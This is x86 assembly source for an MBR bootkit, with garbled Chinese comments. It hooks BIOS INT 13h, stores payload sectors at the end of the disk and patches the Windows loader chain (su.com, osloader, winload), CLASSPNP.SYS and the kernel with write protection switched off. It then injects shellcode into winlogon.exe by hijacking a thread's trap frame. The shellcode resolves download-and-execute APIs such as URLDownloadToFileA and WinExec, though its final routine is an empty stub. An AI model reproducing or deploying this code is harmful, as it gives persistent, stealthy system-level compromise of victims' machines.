;���׳������⣺1��ģ��2������С������λ�á�2��΢��MBRλ�á�
;˼·��hook int13--->hook su.com----->hook osload.exe--->hook winload.exe---->hook CLASSPNP.SYS---->hook �ں�---->hook winlogo.exe���߳�
;��������jwasm aa.asm ��������doslnk /tiny aa.obj
.386p                          
.model tiny  

include j:\RadASM\jwasm\Samples\ntddk.inc
include J:\RadASM\masm32\include\w2k\native.inc
;include J:\RadASM\masm32\tools\IoctlDecoder\src\wnet\ntdddisk_.inc
include J:\RadASM\jwasm\Include\w2k\ntdddisk.inc

;**************************************16λ����ģʽ����**************************************** 
;_main proto stdcall :qword
EVENT_ALL_ACCESS	EQU	( STANDARD_RIGHTS_REQUIRED  or  SYNCHRONIZE  or  3h )
STANDARD_RIGHTS_REQUIRED	EQU	000F0000h
SYNCHRONIZE	        EQU	00100000h
FILE_ATTRIBUTE_NORMAL	EQU	00000080h
FILE_SHARE_WRITE	EQU	00000002h
GENERIC_READ	        EQU	80000000h
PAGE_READWRITE       	EQU	04h
GENERIC_WRITE          	EQU	40000000h
SECTION_MAP_WRITE	EQU	0002h
KernelMode equ 0
NULL                    equ     0
OBJ_KERNEL_HANDLE       equ     000000200h
PAGE_EXECUTE_READWRITE  equ     40h     
MEM_COMMIT              equ     1000h   
FALSE                   equ     0
FILE_NON_DIRECTORY_FILE equ     00000040h
FILE_OPEN               equ     00000001h
FILE_SYNCHRONOUS_IO_NONALERT  equ          000000020h
FILE_SHARE_READ         equ     1h
FILE_DEVICE_DISK        equ     7h
FILE_ANY_ACCESS         equ     0h
FilePositionInformation equ     14
STANDARD_RIGHTS_REQUIRED equ    000F0000h
SYNCHRONIZE             equ     00100000h
 MUTANT_QUERY_STATE     equ     0001h
 MUTEX_ALL_ACCESS       equ  (STANDARD_RIGHTS_REQUIRED or SYNCHRONIZE or MUTANT_QUERY_STATE)


FILE_POSITION_INFORMATION STRUCT
	CurrentByteOffset	LARGE_INTEGER	<>
FILE_POSITION_INFORMATION ENDS
PFILE_POSITION_INFORMATION typedef ptr FILE_POSITION_INFORMATION


Code_Sise equ 200h  
RealCodeSize equ  CodeEnd-CodeStart 
ProtectCodeSize  equ  ProtectCodeEnd-ProtectCodeStart  
RealCode segment byte use16     
CodeStart:                     
  cli 
  xor ax,ax
  mov es,ax
  mov es:word ptr [413h],27ch     ;DOS���������ڴ�ռ�                    
  mov ax,9f00h                    ;9f00�����ڴ�һֱ���������ã�ֱ��osloder�Ĺؼ�call���ںˣ�win7ϵͳ9f00��ҳ���߼���ַΪ804c1000h��xpΪ8009f000   ;����ı����ڴ�;es:0 -> ����ı����ڴ��ַ
  mov es,ax
  mov ds,ax
  xor si,si
  mov word ptr ds:[si],26         
  mov ah,48h
  mov dl,80h
  int 13h                         ;��ȡ���̲���������������
  


  mov eax,ds:[si+16]
  sub eax,10;д�����̵�����10����
  mov dword ptr cs:[7c00h+sectors],eax
  mov eax,dword ptr ds:[si+20]
  mov dword ptr cs:[7c00h+sectors+4],eax

  
  ;��дDAP
  mov ax,9e00h
  mov ds,ax
  mov eax,es:[si+16]
  sub eax,9;��ȡ����β��������10������
  mov ebx,es:[si+20]
  mov byte ptr ds:[si],10h  
  mov byte ptr ds:[si+1],0
  mov word ptr ds:[si+2],6;��ȡ��������
  mov dword ptr ds:[si+4],9f000200h
  mov dword ptr ds:[si+8],eax
  mov dword ptr ds:[si+12],ebx
  mov ah,42h
  mov dl,80h
  int 13h;��ȡhook �ںˡ�winload.exe osload.exe �Լ�su.com���뵽0x9f200
  
  
  
  cld 
  xor ax,ax
  mov ds,ax                           ;
  mov si,7c00h
  xor di,di                      ;���뱻������es:di��(����ı����ڴ���).ע�⣺������ƫ��ֵ�ı䡣
  mov cx,Code_Sise
  rep movsb                      ;�������뵽�����ڴ�
  mov eax,ds:[13h*4]             ;��װ���ǵ�INT13h����
  mov ds:[85h*4],eax             ;����ɵ�int13����ֵ
  mov word ptr ds:[13h*4],INT13Hook
  mov ds:[(13h*4) + 2],es        ;�������ǵ�INT13h����
  
  
  push es
  push BootOS
  retf
  
 
  
  
;**************;jmp far 0:7c00h ;����ϵͳ   cs=es=#9f00
BootOS:
  mov ax,9e00h
  mov ds,ax
  xor si,si
  mov eax,dword ptr cs:[sectors]
  mov ebx,dword ptr cs:[sectors+4]
  mov byte ptr ds:[si],10h  
  mov byte ptr ds:[si+1],0
  mov word ptr ds:[si+2],1
  mov dword ptr ds:[si+4],00007c00h
  mov dword ptr ds:[si+8],eax
  mov dword ptr ds:[si+12],ebx
  mov ah,42h
  mov dl,80h
  int 13h;��ȡ΢���MBR��0x7c00
  
  ;mov ax,0301h;ah=���ܺţ�AL=������
  ;mov cx,0001h;ch=���棬cl������
  ;mov dx,0080h;dh=��ͷ��dl=��������
  ;mov bx,7c0h;es:bx ��������ַ
  ;mov es,bx
  ;mov bx,0
  ;int 13h;Ϊ��ʵ������Իָ�΢��MBR�����Բ��ص���ʵ�������ʧ�ܣ������޷�����ϵͳ
  db  0eah
  dd  7c00h                       ;jmp far 0:7c00h ;����ϵͳ
  sectors dq 0 ;�������̵�����10�����߼�����ֵ
;****************hook int 13H
INT13Hook:
  pushf
  cmp ah, 42h					
  je  short @Int13Hook_ReadRequest
  cmp ah, 02h					
  je  short @Int13Hook_ReadRequest
  popf
  int 85h
  iret
  
@Int13Hook_ReadRequest:;�ж�ntldr�ǲ��Ǳ����ص��ڴ���
   popf
   int 85h
   pushf
   pusha
   push ds
   push es
   mov cx,6000h
   push 2000h
   pop ds
   xor si,si
   .repeat 
   	.break .if (dword ptr ds:[si]==55665266h && word ptr ds:[si+4]==03366h);����su�Ƿ���ȫ�����ؽ��ܵ�0x20000�ڴ棬������66 52 push edx    66 55 push ebp     66 33 ED xor ebp,ebp
   	inc si
   	dec cx
   .until cx==0
   
   .if cx>0 ;������ƥ�䵽
   	sub si,6
   	push si
   	push cs
   	pop es;cs=0x9f00
   	mov di,@@@7-ProtectCodeStart+200h
   	mov cx,20
   	cld
   	rep movsb;����ԭʼsu.com����osload.exe 401000���Ĵ���,�����ת��������������Ҳ��֪�����ͽ�CallOsload
   	
   	pop di
   	push ds
   	pop es
   	push cs
   	pop ds
   	mov si,200h
   	mov cx,17
   	rep movsb ;hook CallOsload
   	
   	;�ָ�int 13
   	mov es,cx;cx=0
   	mov eax,dword ptr es:[85h*4]
   	mov dword ptr es:[13h*4],eax
   .endif
   
   pop es
   pop ds
   popa
   popf
   iret


db 512-($-CodeStart) dup(0)
CodeEnd: 
RealCode ends
;**************************************32λ����ģʽ����**************************************** 
;**************************************32λ����ģʽ����**************************************** 
;**************************************32λ����ģʽ����**************************************** 
;**************************************32λ����ģʽ����**************************************** 
;**************************************32λ����ģʽ����**************************************** 
;**************************************32λ����ģʽ����**************************************** 
ProtectCode segment byte use32 
ProtectCodeStart:
;su______________________________________________________
su:;cpu����16λģʽ������Ҫ��66Hǰ׺����ʾ32λ����������16λģʽ��
   db 66h
   pushfd
   db 66h
   pushad
   db 66h
   mov ecx,009f000h+RealCodeSize+hook_ntldr_retf
   db 66h
   push 20h
   db 66h
   push ecx
   db 66h,0cbh ;retfw hook_ntldr_retf cpu�л���32λģʽ
hook_ntldr_retf equ $-su
        
        mov edi,401000h;osload �����rva
        mov ecx,52a00h;�ƶ�osload������Χ����ֹosload������������仯�������쳣��osload.text�δ�С
        
        
        dec edi
     @@:inc edi
        dec ecx
        jz @@@14
        cmp dword ptr [edi],8b5bd0ffh;�����붨λosload.  ������  FF D0 call eax     5B pop ebx     8B E3 mov esp, ebx
        jnz @B
        ;edi=osload����winload�����ƫ�� call eax��
        mov esi,9f200h+osload_code-ProtectCodeStart;hook winload��Դ�����ƫ�ơ�
        mov ecx, osload_code_retf- osload_code
        cld
        rep movsb
        
        mov esi,@@@7+9f200h
        .repeat 
        	lodsb
        	.if al==66h
        		mov byte ptr[esi-1],90h;����֮ǰ���������Ĵ����Ǽ�66ǰ׺�ģ�����CPUģʽΪ32λ������66H nop���������쳣
        	.endif
        .until  al==0cbh
        
        
        
        @@@14:
        popad
        popfd
        ;hook��osload��ִ��suԭ������osload����
        @@@7:
        db 20 dup (90h)
        @@@8:
;osload______________________________________________________________
osload_code: 
        pushfd
        pushad
        mov eax,009f000h+RealCodeSize+osload_code_retf-ProtectCodeStart
        jmp eax
osload_code_retf:
        mov edi,52e000h;winload.text ��ʼ��ַ
        mov ecx,57000h;winload.text��С����ֹ�쳣
     @@:inc edi
        dec ecx
        jz @F
        cmp dword ptr [edi+4],5251d233h;�����붨λ winload�����ں˴���     33 D2(xor edx, edx) 51(push ecx)52(push edx)                       
        jnz @B
        mov esi,009f000h+RealCodeSize+winload-ProtectCodeStart
        mov ecx,winload_code_retf-winload
        rep movsb
        
        @@:
        popad
        popfd      
        ;ִ��ԭ��osloadβ������           
    
        call eax  
;winload_________________________________________________________________         
winload:;�������ں�ģ���9F000��������ڴ�ᱻ�ں˷�ҳӳ�䣬���Ǿ��޷������ˣ������ں˵Ĵ���Ҫ�������ں˷��ʵĵ���������Ҫ֪������ڴ��ַ��
        ;һ��ʼ�ҿ������ں�text�ε�0�������������ں˵İ汾�ö࣬�еİ汾0���������ǵĴ��룬�еĲ��������������˸�΢���궼�����µ�������
        ;����0���㹻����������CLASSPNP.SYS���Ժ����΢������ˣ����Ի����       
        pushad
        pushfd
        mov eax,009f000h+RealCodeSize+winload_code_retf-ProtectCodeStart
        jmp eax
        nop
        nop
winload_code_retf:        
        mov ecx,[ecx+4*4];ecx=  _KeLoaderBlock ��������
        .while ecx
        	mov edx,[ecx+12*4];��������ָ�� UNICODE�ַ�
        	.break .if (dword ptr [edx]==004c0043h &&  dword ptr [edx+4]==00530041H);CLASSPNP
        	mov ecx,[ecx]
        .endw
        mov eax,[ecx+6*4];BassAddress
        ;hook CLASSPNP
        mov ecx,dword ptr [eax+03ch]
        add ecx,eax;ecx=PE     
        movzx edx,word ptr [ecx+14h];SizeOfOptionHeader
        lea ecx,[ecx+edx+18h]
        mov ebx,dword ptr[ecx+8]
        mov edx,dword ptr[ecx+8+4]
        lea edi,[edx+ebx];CLASSPNP.text ��β��0����ַrva
        add edi,eax ;
        push edi;edi=CLASSPNP.textβ��
        mov esi,009f000h+RealCodeSize+nt_code-ProtectCodeStart
        mov ecx,nt_code_end-nt_code
        rep movsb;�����ں˴��뵽fltmgr.textβ��
        
        mov edx,eax
        mov ecx,0017000h;CLASSPNP.text�δ�С
     @@:inc edx
        dec ecx
        jz @@winload_end
        cmp dword ptr [edx],4589c13bh;�����붨λclasspnp!ClassReadWrite+ae    cmp eax, ecx         mov [ebp+Irp], eax
        jnz @B
        
        pop edi;edi=CLASSPNP.textβ��
        sub edi,edx
        sub edi,5
        mov byte ptr [edx],0e8h
        mov dword ptr [edx+1],edi
        
        
        
        
        @@winload_end:
        popfd
        popad
        ;ִ��ԭ��winloadβ������,12�ֽ�
        mov     eax, [esp+8]
        xor     edx, edx
        push    ecx
        push    edx
        push    8
        push    eax
        retf
           

;nt______________________________________________
nt_code:  
ClassReadWrite proc stdcall 
	pushad
	pushfd
	push dword ptr[esp+24h]
	call ClassReadWrite@
	popfd
	popad
        cmp     eax, ecx
        mov     [ebp+0Ch], eax
	ret

ClassReadWrite endp   

ClassReadWrite@ proc stdcall   pNextDirective:dword
        mov eax,cr0;ȡ��д����,��ԭclassPnPClassReadWrite
        btc eax,16
        mov cr0,eax
   
        mov eax, pNextDirective
        mov dword ptr [eax-5],4589c13bh
        mov byte ptr  [eax-1],0ch
   

	
	;��ȡ�ں�IoStartPacket��ַ
	.if word ptr [eax+66h]==15ffh
		mov eax,[eax+66h+2]
		mov eax,[eax]
		and eax,0fffff000h
		add eax,1000h
		@@:
		sub eax,1000h
		cmp word ptr [eax],"ZM"
		jnz @B
	.endif
        push 11
        call @F
        db "ZwOpenFile",0
     @@:push eax
        call _GetProcAddress
        
        call @F
     @@:pop ebx
        add ebx,ZwOpenFile-$+1-5
        sub ebx,eax
        mov byte ptr [eax],0e8h  ;����call ָ���ʽΪ��E8 XXXXXXXX ��XXXXXXXX�����Ŀ���ַƫ��
        mov dword ptr [eax+1],ebx 
        
        
        
        mov eax,cr0;�ָ�д����	
        btc eax,16
        mov cr0,eax	
        ret

ClassReadWrite@ endp

ZwOpenFile proc stdcall 
	pushad
	pushfd
	push dword ptr[esp+24h];ZwOpenFile��mov eax��25h  ָ��ĵ�ַ��Ϊ����
	call ZwOpenFile@
	popfd
	popad
	mov eax,0b3h	
	ret

ZwOpenFile endp

ZwOpenFile@ proc stdcall   pNextDirective:dword;��������ָ��
        LOCAL pBuf
        LOCAL buflen
        LOCAL hProcessHandle
        LOCAL ApcState[18h]:byte
        LOCAL pProcessListHead
        LOCAL pExplorerProcess
        LOCAL Base
        LOCAL fileNameUnicodeString:UNICODE_STRING
        local objectAttributes:OBJECT_ATTRIBUTES
        LOCAL ioStatus:IO_STATUS_BLOCK
        LOCAL ntFileHandle
        LOCAL pdg:DISK_GEOMETRY_EX
        LOCAL fpi:FILE_POSITION_INFORMATION
        LOCAL PositionFileTable:LARGE_INTEGER
        LOCAL Buffer[512*2]:BYTE
        
        
        LOCAL _KeStackAttachProcess
        LOCAL _ObOpenObjectByPointer
        LOCAL _ZwAllocateVirtualMemory
        LOCAL _ZwCreateFile
        LOCAL _ZwDeviceIoControlFile
        LOCAL _ZwSetInformationFile
        LOCAL _ZwReadFile
        LOCAL _ZwWriteFile
        LOCAL _RtlInitUnicodeString
	mov ebx,fs:124h
	mov ebx,[ebx+50h]
	.if dword ptr [ebx+16ch]!="lniw" || dword ptr [ebx+16ch+4]!="nogo";winlogo.exe systemȨ�� ��ǰ������winlogo.exe��ִ���������
	        ret    
	.endif
	
	mov pExplorerProcess,ebx
         
	
         
	
	;��ȡ�ں�IoStartPacket��ַ
	mov eax,pNextDirective
	mov ebx,cr0
	btc ebx,16
	mov cr0,ebx
	mov byte ptr [eax-5],0b8h;�ָ�ZwOpenFile
	mov dword ptr [eax-4],0b3h
	btc ebx,16
	mov cr0,ebx
	
	
        and eax,0fffff000h
	add eax,1000h
	@@:
	sub eax,1000h
	cmp word ptr [eax],"ZM";��ȡ�ں˻�����ַ
	jnz @B
	mov Base,eax
                                  
                            
        push 22
        call @F
        db "ObOpenObjectByPointer",0
        @@:
        push Base
        call _GetProcAddress
        mov _ObOpenObjectByPointer,eax
        
        push 24
        call @F
        db "ZwAllocateVirtualMemory",0
        @@:
        push Base
        call _GetProcAddress
        mov _ZwAllocateVirtualMemory,eax
        
        push 21
        call @F
        db "KeStackAttachProcess",0
        @@:
        push Base
        call _GetProcAddress
        mov _KeStackAttachProcess,eax
        
        push 13
        call @F
        db "ZwCreateFile",0
        @@:
        push Base
        call _GetProcAddress
        mov _ZwCreateFile,eax
        
        push 22
        call @F
        db "ZwDeviceIoControlFile",0
        @@:
        push Base
        call _GetProcAddress
        mov _ZwDeviceIoControlFile,eax
        
        push 21
        call @F
        db "ZwSetInformationFile",0
        @@:
        push Base
        call _GetProcAddress
        mov _ZwSetInformationFile,eax
        
        push 11
        call @F
        db "ZwReadFile",0
        @@:
        push Base
        call _GetProcAddress
        mov _ZwReadFile,eax
        
        push 12
        call @F
        db "ZwWriteFile",0
        @@:
        push Base
        call _GetProcAddress
        mov _ZwWriteFile,eax
        
        push 21
        call @F
        db "RtlInitUnicodeString",0
        @@:
        push Base
        call _GetProcAddress
        mov _RtlInitUnicodeString,eax
        
        nop
        nop
        nop
        nop
        nop
        nop
        nop
        nop
        nop
        
         

        
        
        
        
        
        
        ;invoke ObOpenObjectByPointer,pExplorerProcess,OBJ_KERNEL_HANDLE,NULL, 008h,NULL, KernelMode,addr hProcessHandle
        lea ebx,hProcessHandle
        push ebx
        push KernelMode
        push NULL
        push 8h
        push NULL
        push OBJ_KERNEL_HANDLE
        push pExplorerProcess
        call _ObOpenObjectByPointer;��ѯWinlogo.exe���̾��
        
        
        ;invoke ZwAllocateVirtualMemory,hProcessHandle,addr pBuf,0,addr buflen,MEM_COMMIT,PAGE_EXECUTE_READWRITE
        mov buflen,shellcode_end-shellcode_start
        mov pBuf,0
        push PAGE_EXECUTE_READWRITE
        push MEM_COMMIT
        lea ebx,buflen
        push ebx
        push 0
        lea ebx,pBuf
        push ebx
        push hProcessHandle
        call _ZwAllocateVirtualMemory;��Winlogo.exe�ռ������ڴ�  
        
        ;invoke KeStackAttachProcess,pExplorerProcess,addr ApcState
        lea ebx,ApcState
        push ebx
        push pExplorerProcess
        call _KeStackAttachProcess;���ӵ�Winlogo.exe�ռ�
  
        mov eax,pExplorerProcess
        mov eax,[eax+188h];ThreadListHead
        
        ;���� Winlogo.exe�Ŀɱ����ȵ��̣߳���ǰ���ڳ�˯                   
        .while eax
                mov edx,20h
                and edx,dword ptr[eax-268h+3ch]
   	        .if dword ptr  [eax-268h+128h] && edx==0;_KTHREAD.Alertable�ɻ����߳� , TrapFrame =[eax-268h+128h]
   	                .break
   	        .else
   		        mov eax,[eax]
   		        
   	       .endif
   	
        .endw
   
   
        mov edx,cr0;ȡ��д����
        btc edx,16
        mov cr0,edx
        
        mov eax,[eax-268h+128h];TrapFrame 
        mov ebx,[eax+68h]
        call @F
     @@:pop ecx
        add ecx,offset EIP-$+1
        mov [ecx],ebx;����EIP
        mov ecx,pBuf
        add ecx,5
        mov [eax+68h],ecx;hook TrapFrame.eip
   
        bts edx,16
        mov cr0,edx
   
        mov ecx,shellcode_end-shellcode_start
        call @F
     @@:pop esi
        add esi,shellcode_start-$+1
        mov edi,pBuf
        rep movsb;��r3Ҫִ�еĴ��뿽����ZwAllocateVirtualMemory������ڴ棬�ȴ�ϵͳ����֮ǰɸѡ���̣߳��ͻ�ִ��r3�Ĵ���			
        ret

ZwOpenFile@ endp  
_GetProcAddress proc stdcall  uses edi esi ebx ecx edx  Base:dword,lpStr:dword,StrSize:dword

   
   mov edi,Base
   mov eax,[edi+3ch];pe header           
   mov edx,dword ptr[edi+eax+78h]           
   add edx,edi           
   mov ecx,[edx+18h];number of functions           
   mov ebx,[edx+20h]           
   add ebx,edi;AddressOfName
   
   search2:           
   dec ecx  
   push ecx         
   mov esi,[ebx+ecx*4]           
   add esi,Base;
   mov edi,lpStr
   mov ecx,StrSize
   repe cmpsb
   pop ecx
   jne search2 
   mov edi,Base  
   mov ebx,[edx+24h]           
   add ebx,edi;indexaddress           
   mov cx,[ebx+ecx*2]           
   mov ebx,[edx+1ch]           
   add ebx,edi           
   mov eax,[ebx+ecx*4] ;     ebx+ecx*4=  pZwCreateFile   
   add eax,edi;ZwCreateFile=eax
   ret
_GetProcAddress endp 
;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;R3shellcode;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
shellcode_start:
        EIP dd ?
        nop

        pushad
        pushfd 
        xor ecx,ecx            
        mov esi,fs:30h            
        mov esi, [esi + 0Ch];            
        mov esi, [esi + 1Ch];
        next_module1:            
        mov ebp, [esi + 08h];            
        mov edi, [esi + 20h];            
        mov esi, [esi];            
        cmp [edi + 12*2],cl              
        jne next_module1            
        mov edi,ebp;BaseAddr of Kernel32.dll
                          
             
        sub esp,200           
        mov ebp,esp;           
        mov eax,[edi+3ch];pe header           
        mov edx,dword ptr[edi+eax+78h]           
        add edx,edi           
        mov ecx,[edx+18h];number of functions           
        mov ebx,[edx+20h]           
        add ebx,edi;AddressOfName
        search1:           
        dec ecx           
        mov esi,[ebx+ecx*4]           
        add esi,edi;           
        mov eax,50746547h;PteG("GetP")           
        cmp [esi],eax           
        jne search1           
        mov eax,41636f72h;Acor("rocA")           
        cmp [esi+4],eax           
        jne search1           
        mov ebx,[edx+24h]           
        add ebx,edi;indexaddress           
        mov cx,[ebx+ecx*2]           
        mov ebx,[edx+1ch]           
        add ebx,edi           
        mov eax,[ebx+ecx*4]           
        add eax,edi           
        mov [ebp+76],eax;��GetProcAddress��ַ����ebp+76��
        
        
        push 0;           
        push DWORD PTR 41797261h;Ayra("aryA")           
        push DWORD PTR 7262694ch;rbiL("Libr")           
        push DWORD PTR 64616f4ch;daoL("Load")           
        push esp           
        push edi           
        call dword ptr [ebp+76]
        add esp,16
        add esp,100 
        ;EAXΪloadlibrary��ebxΪGetProcAddress          
        mov[ebp+80],eax;��LoadLibraryA��ַ����ebp+80��
        mov ebx,[ebp+76]
        nop 
        
        
        
        ;Ҫ�õ�APIȫ������ջ���棬ע��ջƽ�⣬8��DWORD��������������������������������������������
        push ebp
        mov ebp,esp
        sub esp,200
        mov [ebp-4],eax;EAXΪloadlibrary��
        mov [ebp-8],ebx;ebxΪGetProcAddress       
        mov [ebp-12],edi;kernel32��ַ
        
        call @F
        db "CreateThread",0
        @@:
        push dword ptr [ebp-12]
        call dword ptr [ebp-8]
        mov [ebp-16],eax
        
        call @F
        db "CreateFileA",0
        @@:
        push dword ptr [ebp-12]
        call dword ptr [ebp-8]
        mov [ebp-20],eax
        
        call @F
        db "GetFileSize",0
        @@:
        push dword ptr [ebp-12]
        call dword ptr [ebp-8]
        mov [ebp-24],eax
        
        call @F
        db "ntdll.dll",0
        @@:
        call dword ptr [ebp-4]
        mov [ebp-28],eax ;-----------------ntdll.dll
        
        call @F
        db "RtlMoveMemory",0
        @@:
        push dword ptr [ebp-28]
        call dword ptr [ebp-8]
        mov [ebp-32],eax
        
       
        
        call @F
        db "VirtualFree",0
        @@:
        push dword ptr [ebp-12]
        call dword ptr [ebp-8]
        mov [ebp-36],eax  
        call @F
        
        db "VirtualAlloc",0
        @@:
        push dword ptr [ebp-12]
        call dword ptr [ebp-8]
        mov [ebp-40],eax  
        
        
        
        call @F
        db "_lread",0
        @@:
        push dword ptr [ebp-12]
        call dword ptr [ebp-8]
        mov [ebp-44],eax 
        
        
        call @F
        db "user32.dll",0
        @@:
        call dword ptr [ebp-4]
        mov [ebp-48],eax ;-----------------user32.dll
        
        
        
        
        call @F
        db "MessageBoxA",0
        @@:
        push dword ptr [ebp-48]
        call dword ptr [ebp-8]
        mov [ebp-52],eax 
        
        
        
        
        
        call @F
        db "wsprintfA",0
        @@:
        push dword ptr [ebp-48]
        call dword ptr [ebp-8]
        mov [ebp-56],eax
        
        call @F
        db "CopyFileA",0
        @@:
        push dword ptr [ebp-12]
        call dword ptr [ebp-8]
        mov [ebp-60],eax 
        
        call @F
        db "Sleep",0
        @@:
        push dword ptr [ebp-12]
        call dword ptr [ebp-8]
        mov [ebp-64],eax 
        
        call @F
        db "OpenMutexA",0
        @@:
        push dword ptr [ebp-12]
        call dword ptr [ebp-8]
        mov [ebp-68],eax 
        
        call @F
        db "FindFirstFileA",0
        @@:
        push dword ptr [ebp-12]
        call dword ptr [ebp-8]
        mov [ebp-72],eax 
        
        call @F
        db "WinExec",0
        @@:
        push dword ptr [ebp-12]
        call dword ptr [ebp-8]
        mov [ebp-76],eax 
        
        call @F
        db "urlmon.dll",0
        @@:
        call dword ptr [ebp-4]
        mov [ebp-80],eax ;-----------------urlmon.dll
        
        call @F
        db "URLDownloadToFileA",0
        @@:
        push dword ptr [ebp-80]
        call dword ptr [ebp-8]
        mov [ebp-84],eax 
        
        call @F
        db "CreateFileMappingA",0
        @@:
        push dword ptr [ebp-12]
        call dword ptr [ebp-8]
        mov [ebp-88],eax 
        
        
        call @F
        db "MapViewOfFile",0
        @@:
        push dword ptr [ebp-12]
        call dword ptr [ebp-8]
        mov [ebp-92],eax 
        
        
        
        CALL @F 
     @@:pop eax
        add eax,offset fThread-$+1
        .if dword ptr [eax]==0
                mov dword ptr [eax],1
                CALL @F 
             @@:pop eax
                add eax,offset lpThreadId-$+1
                push eax;addr lpThreadId
                push 0
                push 0
                CALL @F 
             @@:pop eax
                sub eax,$-offset shellcode_start-1-5
                push eax
                push 0
                push 0
                call dword ptr[ebp-16]
                
                ;;invoke CreateThread,0,0,offset shellcode_start+5,0,0,addr lpThreadId
                add esp,130h
                call @F
             @@:pop eax
                sub eax,$-1-offset EIP
                mov eax,[eax]
                mov [esp-4],eax
        
                popfd
                popad
        
        
                jmp dword ptr[esp-28h];����ԭ���̵߳�eip
        .endif 
         
        push ebp
        CALL @F 
     @@:pop eax
        add eax,offset RD_XXXX-$+1 
        call eax  ;invoke RD_XXXX ,ebp
        ;invoke Sleep,5265C00h  ˯��24Сʱ
        push 80000000h
        call dword ptr [ebp-64]
        
       
        
        fThread dd 0
        lpThreadId dd 0
        
RD_XXXX:  
RD_XXXX1 proc stdcall api:dword
        LOCAL lpFindFileData[150h]:byte
        LOCAL lpOut[100]:byte

       
        
	ret

RD_XXXX1 endp  

        
shellcode_end:                  
ProtectCodeEnd:  
                 
nt_code_end:        
ProtectCode ends 
   

        
end CodeStart 
